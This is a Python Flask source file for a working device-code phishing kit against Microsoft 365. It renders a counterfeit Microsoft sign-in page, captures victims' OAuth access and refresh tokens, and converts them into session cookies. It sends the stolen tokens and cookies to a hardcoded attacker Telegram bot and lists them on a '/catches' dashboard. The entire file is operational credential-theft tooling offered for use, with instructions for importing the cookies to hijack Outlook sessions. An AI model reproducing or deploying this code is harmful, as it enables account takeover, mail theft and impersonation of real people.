import os
import json
import time
import base64
import uuid
import random
import re
import sqlite3
import threading
import requests
from flask import Flask, request, Response

# ---------------------------------------
# CONFIGURATION
# ---------------------------------------
UPSTREAM = "https://login.microsoftonline.com"
TELEGRAM_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT = "8877118461"
DB_PATH = "/tmp/phish.db"

CLIENT_IDS = [
    "14d82eec-204b-4c2f-b7e8-296a70dab67e",  # Microsoft Graph Command Line Tools
    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
    "1b730954-1685-4b74-9bfd-dac224a7b894",  # Azure AD PowerShell
]
CLIENT_ID_INDEX = 0

DEVICE_CODE_SCOPE = (
    "https://graph.microsoft.com/Mail.ReadWrite "
    "https://graph.microsoft.com/Mail.Send "
    "https://graph.microsoft.com/MailboxSettings.ReadWrite "
    "https://graph.microsoft.com/Calendars.ReadWrite "
    "https://graph.microsoft.com/Contacts.ReadWrite "
    "https://graph.microsoft.com/User.Read "
    "offline_access openid profile"
)

COOKIE_WANTED = [
    "ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT", "ESTSAUTHTCT",
    "SignInStateCookie", "x-ms-gateway-suitename", "ESTSAUTHHPERSISTENT",
    "brcap", "fpc", "esctx", "cltm", "x-ms-cpim-sso",
]

PROXY_LIST = []

app = Flask(__name__)

# ---------------------------------------
# DATABASE MANAGEMENT
# ---------------------------------------
def db_connect():
    con = sqlite3.connect(DB_PATH, timeout=30)
    con.execute("PRAGMA journal_mode=WAL")
    return con

def init_db():
    con = db_connect()
    con.execute("""CREATE TABLE IF NOT EXISTS sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_code TEXT,
        user_code TEXT,
        client_id TEXT,
        interval INTEGER,
        expires_at REAL,
        status TEXT,
        email TEXT,
        tokens TEXT,
        cookies TEXT,
        ts TEXT
    )""")
    cols = [r[1] for r in con.execute("PRAGMA table_info(sessions)").fetchall()]
    if "cookies" not in cols:
        con.execute("ALTER TABLE sessions ADD COLUMN cookies TEXT")
    con.commit()
    con.close()

init_db()

def db_add_session(device_code, user_code, client_id, interval, expires_at):
    con = db_connect()
    con.execute(
        "INSERT INTO sessions (device_code, user_code, client_id, interval, expires_at, status, ts) VALUES (?,?,?,?,?,?,?)",
        (device_code, user_code, client_id, interval, expires_at, "pending",
         time.strftime("%Y-%m-%d %H:%M:%S"))
    )
    sid = con.execute("SELECT last_insert_rowid()").fetchone()[0]
    con.commit()
    con.close()
    return sid

def db_pending_sessions():
    con = db_connect()
    rows = con.execute(
        "SELECT id, device_code, client_id, interval, expires_at FROM sessions WHERE status='pending'"
    ).fetchall()
    con.close()
    return rows

def db_update_session(sid, **kw):
    con = db_connect()
    for k, v in kw.items():
        con.execute(f"UPDATE sessions SET {k}=? WHERE id=?", (v, sid))
    con.commit()
    con.close()

# ---------------------------------------
# TELEGRAM NOTIFICATIONS
# ---------------------------------------
def send_telegram(text):
    try:
        while len(text) > 4000:
            chunk = text[:4000]
            cut = chunk.rfind("\n")
            if cut > 500:
                chunk = text[:cut]
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                data={"chat_id": TELEGRAM_CHAT, "text": chunk},
                timeout=15
            )
            text = text[len(chunk):].lstrip("\n")
        if text:
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                data={"chat_id": TELEGRAM_CHAT, "text": text},
                timeout=15
            )
    except Exception as e:
        print("Telegram error:", e)

def send_telegram_file(filename, content, caption=""):
    try:
        files = {"document": (filename, content.encode())}
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument",
            data={"chat_id": TELEGRAM_CHAT, "caption": caption},
            files=files,
            timeout=30
        )
    except Exception as e:
        print("Telegram file error:", e)

# ---------------------------------------
# DEVICE CODE FLOW
# ---------------------------------------
def request_device_code():
    global CLIENT_ID_INDEX
    for _ in range(len(CLIENT_IDS)):
        client_id = CLIENT_IDS[CLIENT_ID_INDEX]
        try:
            resp = requests.post(
                f"{UPSTREAM}/common/oauth2/v2.0/devicecode",
                data={"client_id": client_id, "scope": DEVICE_CODE_SCOPE},
                timeout=20
            )
            data = resp.json()
            if resp.status_code == 200 and "device_code" in data:
                return client_id, data
            print(f"[SESSION] client_id {client_id} failed: {data.get('error', resp.status_code)}")
            CLIENT_ID_INDEX = (CLIENT_ID_INDEX + 1) % len(CLIENT_IDS)
        except Exception as e:
            print(f"[SESSION] client_id {client_id} exception: {e}")
            CLIENT_ID_INDEX = (CLIENT_ID_INDEX + 1) % len(CLIENT_IDS)
    return None, None

def decode_id_token(id_token):
    try:
        payload = id_token.split(".")[1]
        payload += "=" * (-len(payload) % 4)
        data = json.loads(base64.urlsafe_b64decode(payload))
        return data.get("preferred_username") or data.get("email") or data.get("upn") or "unknown"
    except Exception:
        return "unknown"

# ---------------------------------------
# COOKIE MINTING (SSO Round-Trip)
# ---------------------------------------
def get_victim_cookies(refresh_token, client_id, email):
    try:
        s = requests.Session()
        proxy = random.choice(PROXY_LIST) if PROXY_LIST else None
        if proxy:
            s.proxies = {"http": proxy, "https": proxy}
        s.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
        })

        r = s.post(
            f"{UPSTREAM}/common/oauth2/v2.0/token",
            data={
                "client_id": client_id,
                "grant_type": "refresh_token",
                "refresh_token": refresh_token,
                "scope": DEVICE_CODE_SCOPE,
            },
            timeout=25,
        )
        data = r.json()
        if "access_token" not in data:
            print("[COOKIES] refresh failed:", data.get("error"), data.get("error_description", "")[:200])
            return None

        nonce = uuid.uuid4().hex
        auth_url = (
            f"{UPSTREAM}/common/oauth2/authorize?"
            f"client_id={client_id}&response_type=id_token"
            f"&redirect_uri=https%3A%2F%2Flogin.microsoftonline.com%2Fcommon%2Foauth2%2Fnativeclient"
            f"&scope=openid&response_mode=form_post&prompt=none&nonce={nonce}"
            f"&login_hint={email}"
        )
        resp = s.get(auth_url, timeout=25, allow_redirects=True)

        for _ in range(8):
            m = re.search(
                r'<form[^>]*action=["\']([^"\']+)["\'][^>]*>(.*?)</form>',
                resp.text, re.IGNORECASE | re.DOTALL
            )
            if not m:
                break
            action = m.group(1).replace("&amp;", "&")
            fields = {}
            for inp in re.findall(r"<input[^>]*>", m.group(2), re.IGNORECASE):
                name_m = re.search(r'name=["\']([^"\']+)["\']', inp, re.IGNORECASE)
                if not name_m:
                    continue
                val_m = re.search(r'value=["\']([^"\']*)["\']', inp, re.IGNORECASE)
                fields[name_m.group(1)] = val_m.group(1) if val_m else ""
            if not fields:
                break
            resp = s.post(action, data=fields, timeout=25, allow_redirects=True)

        try:
            s.get(f"{UPSTREAM}/", timeout=20)
        except Exception:
            pass

        cookies = {}
        for c in s.cookies:
            if c.name in COOKIE_WANTED and c.value:
                cookies[c.name] = c.value

        auth_cookies = [k for k in cookies if k.startswith("ESTSAUTH")]
        if not auth_cookies:
            print("[COOKIES] no ESTSAUTH cookies captured - got:", list(cookies.keys()))
            return cookies if cookies else None

        print(f"[COOKIES] captured {len(cookies)} cookies incl. {auth_cookies}")
        return cookies
    except Exception as e:
        print(f"[COOKIES] exception: {e}")
        return None

def format_cookies_text(cookies, email):
    lines = [f" COOKIE SESSION - {email}", "Domain: login.microsoftonline.com", ""]
    for name, value in cookies.items():
        lines.append(f"{name}={value}")
    return "\n".join(lines)

def format_cookie_editor_json(cookies):
    out = []
    for name, value in cookies.items():
        out.append({
            "domain": "login.microsoftonline.com",
            "name": name,
            "path": "/",
            "value": value,
            "secure": True,
            "httpOnly": True,
            "sameSite": "no_restriction",
        })
    return json.dumps(out, indent=2)

# ---------------------------------------
# POLLING WORKER (self-restarting)
# ---------------------------------------
def poll_worker():
    print("[WORKER] poll_worker started")
    while True:
        try:
            sessions = db_pending_sessions()
            if not sessions:
                time.sleep(5)
                continue

            for sid, device_code, client_id, interval, expires_at in sessions:
                if time.time() > expires_at:
                    db_update_session(sid, status="expired")
                    print(f"[WORKER] session {sid} expired")
                    continue

                try:
                    resp = requests.post(
                        f"{UPSTREAM}/common/oauth2/v2.0/token",
                        data={
                            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                            "client_id": client_id,
                            "device_code": device_code,
                        },
                        timeout=20
                    )
                    data = resp.json()
                except Exception as e:
                    print(f"[WORKER] poll error session {sid}: {e}")
                    continue

                if "access_token" in data:
                    email = decode_id_token(data.get("id_token", ""))
                    tokens = {
                        "access_token": data.get("access_token"),
                        "refresh_token": data.get("refresh_token"),
                        "id_token": data.get("id_token"),
                    }

                    cookies = get_victim_cookies(tokens["refresh_token"], client_id, email)

                    db_update_session(
                        sid,
                        status="caught",
                        email=email,
                        tokens=json.dumps(tokens),
                        cookies=json.dumps(cookies) if cookies else "{}"
                    )

                    msg = (f"🏆 New catch!\n"
                           f"Email: {email}\n"
                           f"Session: {sid}\n"
                           f"Access Token:\n{tokens['access_token']}\n\n"
                           f"Refresh Token:\n{tokens['refresh_token']}\n\n"
                           f"ID Token:\n{tokens['id_token']}")

                    if cookies:
                        msg += ("\n\n✅ SESSION COOKIES (domain login.microsoftonline.com):\n"
                                + format_cookies_text(cookies, email))
                        msg += ("\n\n→ Paste into Cookie-Editor on login.microsoftonline.com, "
                                "then open outlook.office.com/mail")

                    if len(msg) > 4000:
                        send_telegram(f"🏆 New catch! Email: {email} (tokens + cookies attached)")
                        send_telegram_file("tokens.txt", json.dumps(tokens, indent=2), f"Tokens for {email}")
                        if cookies:
                            send_telegram_file("cookies.json", format_cookie_editor_json(cookies),
                                               f"Cookie-Editor import for {email} -> login.microsoftonline.com")
                    else:
                        send_telegram(msg)
                        if cookies:
                            send_telegram_file("cookies.json", format_cookie_editor_json(cookies),
                                               f"Cookie-Editor import for {email} -> login.microsoftonline.com")

                    print(f"[WORKER] session {sid} caught email={email} cookies={'yes' if cookies else 'no'}")

                elif data.get("error") == "authorization_pending":
                    pass
                elif data.get("error") == "slow_down":
                    time.sleep(5)
                elif data.get("error") == "expired_token":
                    db_update_session(sid, status="expired")
                    print(f"[WORKER] session {sid} token expired")
                elif data.get("error") in ("authorization_declined", "invalid_grant"):
                    db_update_session(sid, status="declined")
                    print(f"[WORKER] session {sid} declined")

                time.sleep(interval)

        except Exception as e:
            print(f"[WORKER] loop error: {e}")
            time.sleep(5)

def worker_supervisor():
    """Restarts the poll worker automatically if it ever dies."""
    while True:
        try:
            poll_worker()
        except Exception as e:
            print(f"[WORKER] worker crashed, restarting: {e}")
        time.sleep(3)

_worker_started = False
def start_worker():
    global _worker_started
    if not _worker_started:
        threading.Thread(target=worker_supervisor, daemon=True).start()
        _worker_started = True
        print("[WORKER] supervisor launched")

# ---------------------------------------
# PHISHING PAGE (Clean Microsoft Device Login Theme)
# ---------------------------------------
def render_page(user_code, verify_url):
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Microsoft Sign in</title>
<style>
* {{ margin: 0; padding: 0; box-sizing: border-box; }}
body {{
  font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
  background-color: #ffffff;
  color: #1b1b1b;
  min-height: 100vh;
  display: flex;
  flex-direction: column;
}}
.outer {{ flex: 1; display: flex; align-items: flex-start; justify-content: center; padding: 44px 16px; }}
.card {{
  width: 100%;
  max-width: 440px;
  background: #ffffff;
  box-shadow: 0 2px 6px rgba(0,0,0,0.2);
  border: 1px solid #e6e6e6;
  padding: 44px 44px 36px 44px;
}}
.ms-grid-logo {{
  display: grid; grid-template-columns: 21px 21px; gap: 2px; width: 44px; margin-bottom: 16px;
}}
.ms-grid-logo span {{ width: 21px; height: 21px; display: block; }}
.ms-grid-logo span:nth-child(1) {{ background: #f25022; }}
.ms-grid-logo span:nth-child(2) {{ background: #7fba00; }}
.ms-grid-logo span:nth-child(3) {{ background: #00a4ef; }}
.ms-grid-logo span:nth-child(4) {{ background: #ffb900; }}
h1 {{
  font-size: 24px; font-weight: 400; color: #1b1b1b; line-height: 1.3; margin-bottom: 16px;
}}
p.desc {{
  font-size: 15px; color: #1b1b1b; line-height: 1.5; margin-bottom: 24px;
}}
.code-box {{
  display: flex; align-items: center; justify-content: space-between; gap: 12px;
  background: #f8f8f8; border: 1px solid #d2d0ce; border-radius: 4px;
  padding: 14px 16px; margin-bottom: 8px;
}}
.code-display {{
  font-size: 32px; font-weight: 700; letter-spacing: 4px; color: #1b1b1b;
  font-family: 'Consolas', 'Segoe UI', monospace; user-select: all;
}}
.copy-btn {{
  display: inline-flex; align-items: center; gap: 6px; flex-shrink: 0;
  background: #ffffff; border: 1px solid #8a8886; border-radius: 4px;
  color: #0067b8; font-size: 14px; font-weight: 600; font-family: inherit;
  padding: 8px 14px; cursor: pointer; transition: background 0.15s, border-color 0.15s;
}}
.copy-btn:hover {{ background: #f3f2f1; border-color: #0067b8; }}
.copy-btn:active {{ transform: scale(0.97); }}
.copy-btn svg {{ width: 16px; height: 16px; fill: currentColor; }}
.copy-btn.copied {{ color: #107c10; border-color: #107c10; }}
.copy-btn.copied svg {{ fill: #107c10; }}
.copy-hint {{
  font-size: 13px; color: #605e5c; margin-bottom: 28px;
}}
.action-btn {{
  display: block; width: 100%; padding: 10px 12px; background: #0067b8; color: white;
  border: 2px solid #0067b8; font-size: 15px; font-weight: 600; cursor: pointer;
  text-align: center; text-decoration: none; font-family: inherit;
  transition: background 0.1s;
}}
.action-btn:hover {{ background: #005da6; }}
.action-btn:active {{ transform: scale(0.98); }}
.links {{ margin-top: 16px; }}
.links a {{ font-size: 13px; color: #0067b8; text-decoration: none; margin-right: 16px; }}
.links a:hover {{ text-decoration: underline; }}
.footer {{
  background: #f2f2f2; padding: 14px 44px; display: flex; align-items: center;
  font-size: 12px; color: #616161; flex-wrap: wrap; gap: 4px 20px;
}}
.footer a {{ color: #616161; text-decoration: none; margin-right: 20px; }}
.footer a:hover {{ text-decoration: underline; }}
.footer .copyright {{ margin-left: auto; }}
@media (max-width: 500px) {{
  .card {{ padding: 32px 24px; box-shadow: none; border: none; }}
  .footer {{ padding: 14px 24px; }}
  .footer .copyright {{ margin-left: 0; }}
  .code-display {{ font-size: 24px; letter-spacing: 2px; }}
  .code-box {{ flex-direction: column; }}
  .copy-btn {{ width: 100%; justify-content: center; }}
}}
</style>
</head>
<body>
<div class="outer">
  <div class="card">
    <div class="ms-grid-logo"><span></span><span></span><span></span><span></span></div>
    <h1>Enter the code we provided</h1>
    <p class="desc">To continue verifying your account, copy the code below and enter it on the Microsoft verification page.</p>
    <div class="code-box">
      <span class="code-display" id="uc">{user_code}</span>
      <button class="copy-btn" id="copyBtn" onclick="copyCode()">
        <svg viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
        <span id="copyLabel">Copy code</span>
      </button>
    </div>
    <div class="copy-hint">Keep this code handy — you'll need it on the next page.</div>
    <a href="#" class="action-btn" onclick="go(); return false;">Next</a>
    <div class="links">
      <a href="#">Sign in with a different Microsoft account</a>
    </div>
  </div>
</div>
<footer class="footer">
  <div>
    <a href="#">Terms of use</a>
    <a href="#">Privacy &amp; cookies</a>
    <a href="#">. . .</a>
  </div>
  <div class="copyright">© 2026 Microsoft</div>
</footer>
<script>
function doCopy() {{
  var code = "{user_code}";
  if (navigator.clipboard && navigator.clipboard.writeText) {{
    navigator.clipboard.writeText(code).catch(function(){{}});
  }} else {{
    var ta = document.createElement("textarea");
    ta.value = code; document.body.appendChild(ta);
    ta.select(); try {{ document.execCommand("copy"); }} catch(e) {{}}
    document.body.removeChild(ta);
  }}
}}
function copyCode() {{
  doCopy();
  var btn = document.getElementById("copyBtn");
  var label = document.getElementById("copyLabel");
  btn.classList.add("copied");
  label.textContent = "Copied ✓";
}}
function go() {{
  doCopy();
  setTimeout(function(){{ window.location.href = "{verify_url}"; }}, 250);
}}
</script>
</body>
</html>"""

# ---------------------------------------
# ROUTES
# ---------------------------------------
@app.route("/", methods=["GET"])
def home():
    start_worker()

    client_id, data = request_device_code()
    if not data:
        return "<h2>Service temporarily unavailable, please retry.</h2>", 503

    sid = db_add_session(
        data["device_code"], data["user_code"], client_id,
        data.get("interval", 5), time.time() + int(data.get("expires_in", 900))
    )
    print(f"[SESSION] new session {sid} user_code={data['user_code']}")

    return Response(render_page(data["user_code"], data["verification_uri"]),
                    mimetype="text/html")


@app.route("/test_tg", methods=["GET"])
def test_tg():
    start_worker()
    send_telegram("✅ Test message from your phishing app - Telegram works!")
    return "Telegram test sent - check your DMs."


@app.route("/catches", methods=["GET"])
def catches():
    start_worker()
    con = db_connect()
    rows = con.execute(
        "SELECT id, email, tokens, cookies, ts FROM sessions WHERE status='caught' ORDER BY id DESC LIMIT 20"
    ).fetchall()
    con.close()

    html = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Catches</title>
<style>
body { font-family: 'Segoe UI', sans-serif; background: #faf9f8; padding: 24px; }
h1 { color: #0078d4; }
.card { background: white; border: 1px solid #e1dfdd; border-radius: 8px; padding: 16px; margin-bottom: 16px; box-shadow: 0 1.6px 3.6px rgba(0,0,0,0.13); }
.email { font-weight: 700; color: #005a9e; font-size: 16px; }
.ts { color: #a19f9d; font-size: 12px; }
pre { background: #f3f2f1; padding: 10px; border-radius: 4px; font-size: 11px; white-space: pre-wrap; word-break: break-all; }
details { margin: 6px 0; }
summary { cursor: pointer; font-weight: 600; color: #323130; }
</style></head><body>
<h1>Caught Sessions (last 20)</h1>"""

    if not rows:
        html += "<p>No catches yet.</p>"

    for sid, email, tokens, cookies, ts in rows:
        html += f'<div class="card"><div class="email">#{sid} — {email}</div>'
        html += f'<div class="ts">{ts}</div>'
        try:
            t = json.loads(tokens or "{}")
            html += '<details><summary>Access Token</summary><pre>'
            html += (t.get("access_token") or "none") + '</pre></details>'
            html += '<details><summary>Refresh Token</summary><pre>'
            html += (t.get("refresh_token") or "none") + '</pre></details>'
            html += '<details><summary>ID Token</summary><pre>'
            html += (t.get("id_token") or "none") + '</pre></details>'
        except Exception:
            html += "<p>Token parse error</p>"
        try:
            c = json.loads(cookies or "{}")
            if c:
                cookie_str = "; ".join(f"{k}={v}" for k, v in c.items())
                html += f'<details><summary>Cookies ({len(c)})</summary><pre>{cookie_str}</pre></details>'
        except Exception:
            pass
        html += "</div>"

    html += "</body></html>"
    return Response(html, mimetype="text/html")


if __name__ == "__main__":
    start_worker()
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
